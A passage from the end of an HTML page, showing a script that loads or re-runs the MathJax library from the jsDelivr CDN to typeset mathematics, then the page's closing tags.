      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
